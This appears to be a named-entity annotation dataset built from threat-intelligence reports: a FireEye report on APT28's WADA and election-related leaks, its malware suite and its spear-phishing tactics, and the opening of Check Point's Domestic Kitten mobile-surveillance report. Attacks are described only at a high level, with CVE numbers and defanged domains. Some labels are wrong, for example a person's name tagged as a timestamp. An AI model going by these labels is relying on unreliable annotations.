APT28-Center-of-Storm-2017,", with Russian sports minister  
",O
APT28-Center-of-Storm-2017,Vitaly Mutko,identity
APT28-Center-of-Storm-2017," asking, “How can you prove that the 
hackers are Russian? You blame",O
APT28-Center-of-Storm-2017,RUSSIA,country
APT28-Center-of-Storm-2017," for everything,  
it is very in fashion now.”39

20. Gallagher, Sean. “",O
APT28-Center-of-Storm-2017,Guccifer 2.0,identity
APT28-Center-of-Storm-2017, Posts ,O
APT28-Center-of-Storm-2017,DCCC,org
APT28-Center-of-Storm-2017," Docs, Says They’re From Clinton Foundation.” Ars Technica. ",O
APT28-Center-of-Storm-2017,4 Oct. 2016,timestamp
APT28-Center-of-Storm-2017,. Web. ,O
APT28-Center-of-Storm-2017,3 Jan. 2017,timestamp
APT28-Center-of-Storm-2017,". 
21. “Russian Hackers Suspected in French TV Cyberattack.” ",O
APT28-Center-of-Storm-2017,Deutsche Welle,org
APT28-Center-of-Storm-2017,. ,O
APT28-Center-of-Storm-2017,6 Oct. 2015,timestamp
APT28-Center-of-Storm-2017,. Web. ,O
APT28-Center-of-Storm-2017,29 Dec. 2016,timestamp
APT28-Center-of-Storm-2017,". 
22. Joselow, Gabe. “Election Cyberattacks: Pro-Russia Hackers Have Been Accused in Past.” ",O
APT28-Center-of-Storm-2017,NBC News,org
APT28-Center-of-Storm-2017,. ,O
APT28-Center-of-Storm-2017,3 Nov. 2016,timestamp
APT28-Center-of-Storm-2017,. Web. ,O
APT28-Center-of-Storm-2017,29 Dec. 2016,timestamp
APT28-Center-of-Storm-2017,". 
23.  Clayton, Mark. “Ukraine Election Narrowly Avoided ‘Wanton Destruction’ From Hackers (+Video).” ",O
APT28-Center-of-Storm-2017,The Christian Science Monitor,org
APT28-Center-of-Storm-2017,. ,O
APT28-Center-of-Storm-2017,17 June 2014,timestamp
APT28-Center-of-Storm-2017,. Web. ,O
APT28-Center-of-Storm-2017,2 Jan. 2017,timestamp
APT28-Center-of-Storm-2017,". 
24. “Foundation Board Media Release: ",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017, Strengthens Anti-Doping Worldwide.” ,O
APT28-Center-of-Storm-2017,World Anti-Doping Agency,org
APT28-Center-of-Storm-2017,. ,O
APT28-Center-of-Storm-2017,18 November 2015,timestamp
APT28-Center-of-Storm-2017,".
25.  “Russia State-Sponsored Doping Across Majority of Olympic Sports, Claims Report.” ",O
APT28-Center-of-Storm-2017,The BBC,org
APT28-Center-of-Storm-2017,. ,O
APT28-Center-of-Storm-2017,18 July 2016,timestamp
APT28-Center-of-Storm-2017,. Web. ,O
APT28-Center-of-Storm-2017,29 Dec. 2016,timestamp
APT28-Center-of-Storm-2017,". 
26.  Macguire, Eoghan. Almasy, Steve. “271 Russian Athletes Cleared for Rio Games.” ",O
APT28-Center-of-Storm-2017,CNN,org
APT28-Center-of-Storm-2017,. ,O
APT28-Center-of-Storm-2017,5 August 2016,timestamp
APT28-Center-of-Storm-2017,. Web. ,O
APT28-Center-of-Storm-2017,29 Dec. 2016,timestamp
APT28-Center-of-Storm-2017,". 
27.  “Cyber Security Update: WADA’s Incident Response.” ",O
APT28-Center-of-Storm-2017,World Anti-Doping Agency,org
APT28-Center-of-Storm-2017,. ,O
APT28-Center-of-Storm-2017,5 Oct. 2016,timestamp
APT28-Center-of-Storm-2017,. Web. ,O
APT28-Center-of-Storm-2017,3 Jan. 2017,timestamp
APT28-Center-of-Storm-2017,". 
28.  “",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017, Confirms Attack by Russian Cyber Espionage Group.” ,O
APT28-Center-of-Storm-2017,World Anti-Doping Agency,org
APT28-Center-of-Storm-2017,. ,O
APT28-Center-of-Storm-2017,13 Sept. 2016,timestamp
APT28-Center-of-Storm-2017,".
29. “",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017, Confirms Another Batch of Athlete Data Leaked by Russian Cyber Hackers ‘,O
APT28-Center-of-Storm-2017,Fancy Bear,threat_actor
APT28-Center-of-Storm-2017,.’” ,O
APT28-Center-of-Storm-2017,World Anti-Doping Agency,org
APT28-Center-of-Storm-2017,. ,O
APT28-Center-of-Storm-2017,14 Sept. 2016,timestamp
APT28-Center-of-Storm-2017,. Web. ,O
APT28-Center-of-Storm-2017,29 Dec. 2016,timestamp
APT28-Center-of-Storm-2017,. ,O
APT28-Center-of-Storm-2017,<,O
APT28-Center-of-Storm-2017,">
30. [OP PL]. “www.tas-cas.org.” Online video clip. YouTube. YouTube, ",O
APT28-Center-of-Storm-2017,9 Aug. 2016,timestamp
APT28-Center-of-Storm-2017,. Web. ,O
APT28-Center-of-Storm-2017,3 Jan. 2017,timestamp
APT28-Center-of-Storm-2017,". 
31.  Anonymous Poland (@anpoland). “@Cryptomeorg @ben_rumsby @PogoWasRight @Jason_A_Murdock @Cyber_War_News @kevincollier Tomorrow will ddos ",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017, and publish some secret dosc.” ,O
APT28-Center-of-Storm-2017,11 Aug 2016 10:10 AM,timestamp
APT28-Center-of-Storm-2017,". Tweet. 
32.  Anonymous Poland (@anpoland). “@JoeUchill within a few days will be new attack on the ",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017,/Olimpic.” ,O
APT28-Center-of-Storm-2017,5 Sept. 2016 5:19 AM,timestamp
APT28-Center-of-Storm-2017,". Tweet. 
33. Fancy Bears’ HT (fancybears). “@AnonPress Greetings. We hacked #",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017,". We have Proof of American Athletes taking doping. Fancybear.net.” 
34.  Ibid.
35.  “",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017, Confirms Attack by Russian Cyber Espionage Group.”,O
APT28-Center-of-Storm-2017,World Anti-Doping Agency,org
APT28-Center-of-Storm-2017,. ,O
APT28-Center-of-Storm-2017,13 Sept. 2016,timestamp
APT28-Center-of-Storm-2017,".
36.  Russian Hackers Leak ",O
APT28-Center-of-Storm-2017,Simone Biles,identity
APT28-Center-of-Storm-2017, and ,O
APT28-Center-of-Storm-2017,Serena Williams,timestamp
APT28-Center-of-Storm-2017, Files.” ,O
APT28-Center-of-Storm-2017,The BBC,org
APT28-Center-of-Storm-2017,. ,O
APT28-Center-of-Storm-2017,13 Sept. 2016,timestamp
APT28-Center-of-Storm-2017,. Web. ,O
APT28-Center-of-Storm-2017,29 Dec. 2016,timestamp
APT28-Center-of-Storm-2017,". 
37.  Rumsby, Ben. “US Superstars ",O
APT28-Center-of-Storm-2017,Serena,identity
APT28-Center-of-Storm-2017, and ,O
APT28-Center-of-Storm-2017,Venus Williams,identity
APT28-Center-of-Storm-2017, and ,O
APT28-Center-of-Storm-2017,Simone Biles,identity
APT28-Center-of-Storm-2017," Given Drugs Exemption, Russian Hackers Reveal.” ",O
APT28-Center-of-Storm-2017,The Telegraph,org
APT28-Center-of-Storm-2017,. ,O
APT28-Center-of-Storm-2017,14 Sept. 2016,timestamp
APT28-Center-of-Storm-2017,. Web. ,O
APT28-Center-of-Storm-2017,29 Dec. 2016,timestamp
APT28-Center-of-Storm-2017,". 
38.  Luhn, Alec.”Fancy Bears Origins Unclear But",O
APT28-Center-of-Storm-2017,RUSSIA,country
APT28-Center-of-Storm-2017, Seizes Chance to Put Boot into ,O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017,.” ,O
APT28-Center-of-Storm-2017,15 Sept. 2016,timestamp
APT28-Center-of-Storm-2017,. Web. ,O
APT28-Center-of-Storm-2017,29 Dec. 2016,timestamp
APT28-Center-of-Storm-2017,". 
39.  Gibson, Owen. “Russian Sports Minister Vitaly Mutko Denies Link to ",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017, Hackers. ,O
APT28-Center-of-Storm-2017,The Guardian,org
APT28-Center-of-Storm-2017,. ,O
APT28-Center-of-Storm-2017,14 Sept. 2016,timestamp
APT28-Center-of-Storm-2017,. Web. ,O
APT28-Center-of-Storm-2017,29 Dec. 2016,timestamp
APT28-Center-of-Storm-2017,". 

FALSE HACKTIVIST PERSONAS CLAIM TO TARGET ",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017,", LEAK ATHLETE DATA 

",O
APT28-Center-of-Storm-2017,AUG 9,timestamp
APT28-Center-of-Storm-2017,"

The actor  
@anpoland, 
purporting to  
represent 
“Anonymous ",O
APT28-Center-of-Storm-2017,Poland,country
APT28-Center-of-Storm-2017,",” 
claims to have 
defaced the  
",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017," website.30

",O
APT28-Center-of-Storm-2017,AUG 11,timestamp
APT28-Center-of-Storm-2017," 

On ",O
APT28-Center-of-Storm-2017,August 11,timestamp
APT28-Center-of-Storm-2017,"  
@anpoland threatens 
to conduct a DDoS 
attack against and 
leak data from ",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017,",  
but fails to follow 
through on the 
threats.31,32

",O
APT28-Center-of-Storm-2017,SEP 12,timestamp
APT28-Center-of-Storm-2017,"

“",O
APT28-Center-of-Storm-2017,Fancy Bears,threat_actor
APT28-Center-of-Storm-2017,"’ Hack 
Team”, a previously 
unknown group 
purporting to 
be affiliated with 
Anonymous, claims 
via ",O
APT28-Center-of-Storm-2017,Twitter,org
APT28-Center-of-Storm-2017," to have 
compromised ",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017,", 
and directs readers 
to a website hosting 
stolen documents.33 

In tweets to 
international 
journalists and  
",O
APT28-Center-of-Storm-2017,Twitter,org
APT28-Center-of-Storm-2017," accounts  
that disseminate 
hacktivist and 
information security 
news, “",O
APT28-Center-of-Storm-2017,Fancy Bears,threat_actor
APT28-Center-of-Storm-2017,"’ 
Hack Team” claims 
to have “proof of 
American athletes 
taking doping.”34

",O
APT28-Center-of-Storm-2017,SEP 13,timestamp
APT28-Center-of-Storm-2017,"

",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017," releases a 
statement confirming 
the breach and 
attributes the 
compromise and  
theft of athlete 
medical data  
to",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,".35

",O
APT28-Center-of-Storm-2017,SEP 15-30,timestamp
APT28-Center-of-Storm-2017,"

“",O
APT28-Center-of-Storm-2017,Fancy Bears,threat_actor
APT28-Center-of-Storm-2017,"’ Hack 
Team” releases five 
additional batches 
of medical files for 
high-profile athletes 
from multiple nations, 
including the ",O
APT28-Center-of-Storm-2017,U.S.,country
APT28-Center-of-Storm-2017,", 
which had applied 
for and received 
Therapeutic Use 
Exemptions (TUEs) 
for medications 
otherwise banned 
from competition.36 

Claiming to support 
“fair play and clean 
sport,” ",O
APT28-Center-of-Storm-2017,Fancy Bears,threat_actor
APT28-Center-of-Storm-2017,"’ 
Hack team calls TUEs 
“licenses for doping.”37



Since releasing our 2014 report, we continue to assess that 
",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017, is sponsored by the,O
APT28-Center-of-Storm-2017,Russian Government,org
APT28-Center-of-Storm-2017,". We further 
assess that",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," is the group responsible for the network 
compromises of ",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017, and the ,O
APT28-Center-of-Storm-2017,DNC,org
APT28-Center-of-Storm-2017," and other entities 
related to the 2016 ",O
APT28-Center-of-Storm-2017,U.S.,country
APT28-Center-of-Storm-2017," presidential election cycle. These 
breaches involved the theft of internal data - mostly emails 
– that was later strategically leaked through multiple forums 
and propagated in a calculated manner almost certainly 
intended to advance particular",O
APT28-Center-of-Storm-2017,Russian Government,org
APT28-Center-of-Storm-2017," aims. In 
a report released on ",O
APT28-Center-of-Storm-2017,January 7 2017,timestamp
APT28-Center-of-Storm-2017,", the ",O
APT28-Center-of-Storm-2017,U.S.,country
APT28-Center-of-Storm-2017, ,O
APT28-Center-of-Storm-2017,"Directorate of 
National Intelligence",org
APT28-Center-of-Storm-2017," described this activity as an “influence 
campaign.” 

This influence campaign - a combination of network 
compromises and subsequent data leaks - aligns closely 
with the Russian military’s publicly stated intentions and 
capabilities. Influence operations, also frequently called 
“information operations,” have a long history of inclusion 
in Russian strategic doctrine, and have been intentionally 
developed, deployed, and modernized with the advent of 
the internet. The recent activity in the ",O
APT28-Center-of-Storm-2017,U.S.,country
APT28-Center-of-Storm-2017," is but one of 
many instances of",O
APT28-Center-of-Storm-2017,Russian Government,org
APT28-Center-of-Storm-2017," influence operations 
conducted in support of strategic political objectives, and it 
will not be the last. As the 2017 elections in ",O
APT28-Center-of-Storm-2017,Europe,country
APT28-Center-of-Storm-2017," approach 
- most notably in ",O
APT28-Center-of-Storm-2017,Germany,country
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,France,country
APT28-Center-of-Storm-2017,", and the ",O
APT28-Center-of-Storm-2017,Netherlands,country
APT28-Center-of-Storm-2017," - we 
are already seeing the makings of similarly concerted efforts.

CONCLUSION

 SPECIAL REPORT /",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,": AT THE CENTER OF THE STORM 8



 SPECIAL REPORT /",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,": AT THE CENTER OF THE STORM 9

In our 2014 report, we identified",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," as a suspected Russian 
government-sponsored espionage actor. We came to this conclusion 
in part based on forensic details left in the malware that",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," had 
employed since at least 2007. We have provided an updated version of 
those conclusions, a layout of the tactics that they generally employ, 
as well as observations of apparent tactical shifts. For full details, 
please reference our 2014 report,",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,": A Window into Russia’s Cyber 
Espionage Operations? 

",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," employs a suite of malware with features indicative of the group’s 
plans for continued operations, as well as the group’s access to resources 
and skilled developers.  

Key characteristics of APT28’s toolset include:

• A flexible, modular framework that has allowed",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,"  
to consistently evolve its toolset since at least 2007. 

• Use of a formal coding environment in which to develop 
tools, allowing the group to create and deploy custom  
modules within its backdoors.

• Incorporation of counter-analysis capabilities including 
runtime checks to identify an analysis environment, obfuscated 
strings unpacked at runtime, and the inclusion of unused 
machine instructions to slow analysis.

• Code compiled during the normal working day in the Moscow 
time zone and within a Russian language build environment. 

OVER

97%
OF  

APT28’S MALWARE 
SAMPLES WERE 

COMPILED DURING  
THE WORKING WEEK

88%
OF  

SAMPLES COMPILED 
BETWEEN 8AM AND 6PM 
IN THE TIMEZONE THAT 

INCLUDES MAJOR RUSSIAN 
CITIES SUCH AS MOSCOW 

AND ST. PETERSBURG

IN ADDITION,  
APT28’S DEVELOPERS 
CONSISTENTLY BUILT 
MALWARE IN RUSSIAN 

LANGUAGE SETTINGS UNTIL

2013

APPENDIX: 
APT28’s Tools, Tactics, and Operational Changes



 SPECIAL REPORT /",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,": AT THE CENTER OF THE STORM 10

APT28’S MALWARE SUITE

TOOL ROLE AK A

",O
APT28-Center-of-Storm-2017,CHOPSTICK,malware
APT28-Center-of-Storm-2017, backdoor ,O
APT28-Center-of-Storm-2017,Xagent,malware
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,webhp,malware
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,SPLM,malware
APT28-Center-of-Storm-2017,", (.v2 ",O
APT28-Center-of-Storm-2017,fysbis,malware
APT28-Center-of-Storm-2017,")

",O
APT28-Center-of-Storm-2017,EVILTOSS,malware
APT28-Center-of-Storm-2017, backdoor ,O
APT28-Center-of-Storm-2017,Sedreco,malware
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,AZZY,malware
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,Xagent,malware
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,ADVSTORESHELL,malware
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,NETUI,malware
APT28-Center-of-Storm-2017,"

",O
APT28-Center-of-Storm-2017,GAMEFISH,malware
APT28-Center-of-Storm-2017, backdoor ,O
APT28-Center-of-Storm-2017,Sednit,malware
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,Seduploader,malware
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,JHUHUGIT,malware
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,Sofacy,threat_actor
APT28-Center-of-Storm-2017,"

",O
APT28-Center-of-Storm-2017,SOURFACE,malware
APT28-Center-of-Storm-2017, downloader Older version of ,O
APT28-Center-of-Storm-2017,CORESHELL,malware
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,Sofacy,threat_actor
APT28-Center-of-Storm-2017,"

",O
APT28-Center-of-Storm-2017,OLDBAIT,malware
APT28-Center-of-Storm-2017,"
credential  
harvester

",O
APT28-Center-of-Storm-2017,Sasfis,malware
APT28-Center-of-Storm-2017,"

",O
APT28-Center-of-Storm-2017,CORESHELL,malware
APT28-Center-of-Storm-2017, downloader Newer version of ,O
APT28-Center-of-Storm-2017,SOURFACE,malware
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,Sofacy,threat_actor
APT28-Center-of-Storm-2017," 

APT28’S OPERATIONAL CHANGES SINCE 2014

",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," continues to evolve its toolkit and refine its tactics  
in what is almost certainly an effort to protect its operational 
effectiveness in the face of heightened public exposure and 
scrutiny. In addition to the continued evolution of the group’s 
first stage tools, we have also noted",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,":

• Leveraging zero-day vulnerabilities in ",O
APT28-Center-of-Storm-2017,Adobe Flash Player,software
APT28-Center-of-Storm-2017,", 
",O
APT28-Center-of-Storm-2017,Java,software
APT28-Center-of-Storm-2017,", and ",O
APT28-Center-of-Storm-2017,Windows,software
APT28-Center-of-Storm-2017,", including ",O
APT28-Center-of-Storm-2017,CVE-2015-1701,O
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,CVE-2015-2424,O
APT28-Center-of-Storm-2017,", 
",O
APT28-Center-of-Storm-2017,CVE-2015-2590,O
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,CVE-2015-3043,O
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,CVE-2015-5119,O
APT28-Center-of-Storm-2017,", and ",O
APT28-Center-of-Storm-2017,"CVE-
2015-7645",O
APT28-Center-of-Storm-2017,". 

• Using a profiling script to deploy zero-days and other  
tools more selectively, decreasing the chance that researchers  
and others will gain access to the group’s tools.

• Increasing reliance on public code depositories, such  
as ",O
APT28-Center-of-Storm-2017,Carberp,malware
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,PowerShell Empire,software
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,P.A.S. webshell,software
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,Metasploit,software
APT28-Center-of-Storm-2017," 
modules, and others in a likely effort to accelerate their 
development cycle and provide plausible deniability.

• Obtaining credentials through fabricated Google  
App authorization and Oauth access requests that allow  
the group to bypass two-factor authentication and other 
security measures.

• Moving laterally through a network relying only  
on legitimate tools that already exist within the victims’ 
systems, at times forgoing their traditional toolset for the 
duration of the compromise.

These changes are not only indicative of APT28’s skills, 
resourcefulness, and desire to maintain operational 
effectiveness, but also highlight the longevity of the  
group’s mission and its intent to continue its activities  
for the foreseeable future.



 SPECIAL REPORT /",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,": AT THE CENTER OF THE STORM 11

",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," TACTICS

We have observed",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," rely on four key tactics when attempting  
to compromise intended targets. These include sending spear-phishing 
emails that either deliver exploit documents that deploy malware onto 
a user’s systems, or contain a malicious URL designed to harvest the 
recipients’ email credentials and provide access to the their accounts. 
",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," has also compromised and placed malware on legitimate websites 
intending to infect site visitors, and has gained access to organizations by 
compromising their web-facing servers

.
",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," IS IN YOUR NETWORK.

Victim goes to link and  
retrieves malicious  

document or is served a 
web-based exploit that  

installs malware.

(",O
APT28-Center-of-Storm-2017,Flash,software
APT28-Center-of-Storm-2017, Vulnerability ,O
APT28-Center-of-Storm-2017,"CVE-
2016-7855",O
APT28-Center-of-Storm-2017, and ,O
APT28-Center-of-Storm-2017,Windows,software
APT28-Center-of-Storm-2017," 

Vulnerability ",O
APT28-Center-of-Storm-2017,CVE-2016-7255,O
APT28-Center-of-Storm-2017," 
were exploited as zero days to 
install malware on victims who 

visited a malicious URL).

Victim opens document, 
and malware is installed by 
exploiting a vulnerability 

(e.g., ARM-NATO_
ENGLISH_30_NOV_2016.

doc leveraged an ",O
APT28-Center-of-Storm-2017,Adobe Flash,software
APT28-Center-of-Storm-2017," 
exploit, ",O
APT28-Center-of-Storm-2017,CVE-2016-7855,O
APT28-Center-of-Storm-2017,",  

to install ",O
APT28-Center-of-Storm-2017,GAMEFISH,malware
APT28-Center-of-Storm-2017,"  
targeted machine).

TACTIC

Craft exploit document  
with enticing lure content.

Send exploit document  
to victim.

Send link mirroring structure  
of legitimate organization’s 

site that is designed to 
expire once users clickit.

Register a domain spoofing 
that of a legitimate 
organization (e.g., 

theguardiannews[.]org).

INFECTION WITH MALWARE VIA SPEAR PHISH

Person is asked to authorize 
application to view mail  

and gives access.

",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," leverages OAuth 
privileges given to malicious 

application to read email.

Recipient visits fake login page 
and enters credentials.

",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," uses stolen  
credentials to access  

mailbox and read email. 

Register a domain spoofing a webmail service  
or an organization’s webmail portal  

(e.g., 0nedrive-0ffice365[.]com)

Send email to targets  
instructing them  

to reset their passwords.

Send email to victims  
warning of security risk  

and asking them to enable 
security service.

TACTIC

WEBMAIL ACCESS VIA SPEAR-PHISH



 SPECIAL REPORT /",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,": AT THE CENTER OF THE STORM 12

",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," IS IN YOUR NETWORK.

Users of the site are redirected using malicious  
iFrame and profiled 

(e.g, this technique was used  
to compromise and infect visitors to numerous  

Polish Government websites in 2014).

Exploit is served to users matching the target profile  
and malware is installed on their system.

Compromise a legitimate site and set up 
malicious iFrame.

TACTIC

INFECTION WITH MALWARE VIA STRATEGIC  
WEB COMPROMISE (SWC)

",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," IS IN YOUR NETWORK.

Exploitation of previously known vulnerabilities  
present on unpatched systems.

Leverage initial compromise to access other systems  
and move deeper into the victim network.

Network reconnaissance to find vulnerable software.

TACTIC

ACCESS THROUGH INTERNET-FACING SERVERS



",O
APT28-Center-of-Storm-2017,FireEye,org
APT28-Center-of-Storm-2017,", Inc.  
1440 McCarthy Blvd. Milpitas, CA 95035  
408.321.6300 / 877.FIREEYE (347.3393) / info@FireEye.com  

www.FireEye.com

To download this or other  
",O
APT28-Center-of-Storm-2017,FireEye,org
APT28-Center-of-Storm-2017," iSIGHT Intelligence reports, 
visit: www.fireeye.com/reports.html

© 2016",O
APT28-Center-of-Storm-2017,FireEye,org
APT28-Center-of-Storm-2017,", Inc. All rights reserved.",O
APT28-Center-of-Storm-2017,FireEye,org
APT28-Center-of-Storm-2017, is a registered trademark of,O
APT28-Center-of-Storm-2017,FireEye,org
APT28-Center-of-Storm-2017,", Inc.  
All other brands, products, or service names are or may be trademarks  
or service marks of their respective owners. GRAF-60.",O
Domestic Kitten An Iranian Surveillance Operation,Domestic Kitten,threat_actor
Domestic Kitten An Iranian Surveillance Operation,": An Iranian Surveillance Operation


",O
Domestic Kitten An Iranian Surveillance Operation,"September 7, 2018",timestamp
Domestic Kitten An Iranian Surveillance Operation,"

",O
Domestic Kitten An Iranian Surveillance Operation,Domestic Kitten,threat_actor
Domestic Kitten An Iranian Surveillance Operation,": An Iranian Surveillance Operation
research.checkpoint.com/domestic-kitten-an-iranian-surveillance-operation/

Chinese strategist ",O
Domestic Kitten An Iranian Surveillance Operation,Sun Tzu,identity
Domestic Kitten An Iranian Surveillance Operation,", Italian political philosopher ",O
Domestic Kitten An Iranian Surveillance Operation,Machiavelli,identity
Domestic Kitten An Iranian Surveillance Operation," and English philosopher
",O
Domestic Kitten An Iranian Surveillance Operation,Thomas Hobbes,identity
Domestic Kitten An Iranian Surveillance Operation," all justified deceit in war as a legitimate form of warfare. Preceding them
all, however, were some in the ",O
Domestic Kitten An Iranian Surveillance Operation,Middle East,country
Domestic Kitten An Iranian Surveillance Operation," who had already internalized and implemented
this strategy to great effect, and continue to do so today.

Recent investigations by ",O
Domestic Kitten An Iranian Surveillance Operation,Check Point,org
Domestic Kitten An Iranian Surveillance Operation," researchers reveal an extensive and targeted attack
that has been taking place ",O
Domestic Kitten An Iranian Surveillance Operation,since 2016,timestamp
Domestic Kitten An Iranian Surveillance Operation," and, until now, has remained under the radar due to
the artful deception of its attackers towards their targets. Through the use of mobile
applications, those behind the attack use fake decoy content to entice their victims to
download such applications, which are in fact loaded with spyware, to then collect sensitive
information about them. Interestingly, these targets include Kurdish and Turkish natives
and ",O
Domestic Kitten An Iranian Surveillance Operation,ISIS,org
Domestic Kitten An Iranian Surveillance Operation," supporters. Most interesting of all, though, is that all these targets are actually
Iranians citizens.

What Information is Collected?

Considering the nature of the target, the data collected about these groups provides those
behind the campaign with highly valuable information that will no doubt be leveraged in
further future action against them. Indeed, the malware collects data including contact lists
stored on the victim’s mobile device, phone call records, SMS messages, browser history
and bookmarks, geo-location of the victim, photos, surrounding voice recordings and more.

Who is Behind the Attack?

While the exact identity of the actor behind the attack remains unconfirmed, current
observations of those targeted, the nature of the apps and the attack infrastructure involved

1/12

https://research.checkpoint.com/domestic-kitten-an-iranian-surveillance-operation/
https://research.checkpoint.com/wp-content/uploads/2018/09/Fig1.png
https://research.checkpoint.com/wp-content/uploads/2018/09/Fig1a.png
https://research.checkpoint.com/wp-content/uploads/2018/09/Fig2.png
https://research.checkpoint.com/wp-content/uploads/2018/09/Fig3.png
https://research.checkpoint.com/wp-content/uploads/2018/09/Fig4.png
https://research.checkpoint.com/wp-content/uploads/2018/09/fig5a.png
https://research.checkpoint.com/wp-content/uploads/2018/09/fig5b.png
https://research.checkpoint.com/wp-content/uploads/2018/09/fig6.png
https://research.checkpoint.com/wp-content/uploads/2018/09/fig7a.png
https://research.checkpoint.com/wp-content/uploads/2018/09/Fig8aa.png
https://research.checkpoint.com/wp-content/uploads/2018/09/Fig8a.png
https://research.checkpoint.com/wp-content/uploads/2018/09/fig9.png
https://research.checkpoint.com/wp-content/uploads/2018/09/fig10aa.png
https://research.checkpoint.com/wp-content/uploads/2018/09/fig11.jpg
https://research.checkpoint.com/the-gazorp-dark-web-azorult-builder/
https://research.checkpoint.com/ransom-warrior-decryption-tool/
https://research.checkpoint.com/sending-fax-back-to-the-dark-ages/
https://research.checkpoint.com/eternalblue-everything-know/
https://research.checkpoint.com/meet-black-rose-lucy-the-latest-russian-maas-botnet/
https://research.checkpoint.com/ceidpagelock-a-chinese-rootkit/
https://research.checkpoint.com/interactive-mapping-of-apt-c-23/


leads us to believe this operation is of Iranian origin. In fact, according to our discussions
with intelligence experts familiar with the political discourse in this part of the world, Iranian
government entities, such as the ",O
Domestic Kitten An Iranian Surveillance Operation,Islamic Revolutionary Guard Corps,org
Domestic Kitten An Iranian Surveillance Operation, (,O
Domestic Kitten An Iranian Surveillance Operation,IRGC,org
Domestic Kitten An Iranian Surveillance Operation,"), ",O
Domestic Kitten An Iranian Surveillance Operation,Ministry of Intelligence,org
Domestic Kitten An Iranian Surveillance Operation,", ",O
Domestic Kitten An Iranian Surveillance Operation,Ministry of Interior and others,org
Domestic Kitten An Iranian Surveillance Operation,", frequently conduct extensive surveillance of
these groups.

Indeed, these surveillance programs are used against individuals and groups that could
pose a threat to stability of the Iranian regime. These could include internal dissidents and
opposition forces, as well as ",O
Domestic Kitten An Iranian Surveillance Operation,ISIS,org
Domestic Kitten An Iranian Surveillance Operation," advocates and the Kurdish minority settled mainly in
",O
Domestic Kitten An Iranian Surveillance Operation,Western Iran,country
Domestic Kitten An Iranian Surveillance Operation,".

While our investigation is still in progress, the research below reveals the full extent of
these targeted attacks, its infrastructure and victims and the possible political story behind
it. In the meantime, we have dubbed this operation ‘",O
Domestic Kitten An Iranian Surveillance Operation,Domestic Kitten,threat_actor
Domestic Kitten An Iranian Surveillance Operation,"’ in line with the naming
of other Iranian ",O
Domestic Kitten An Iranian Surveillance Operation,APT,threat_actor
Domestic Kitten An Iranian Surveillance Operation," attacks.

Data Collection via Mobile Applications

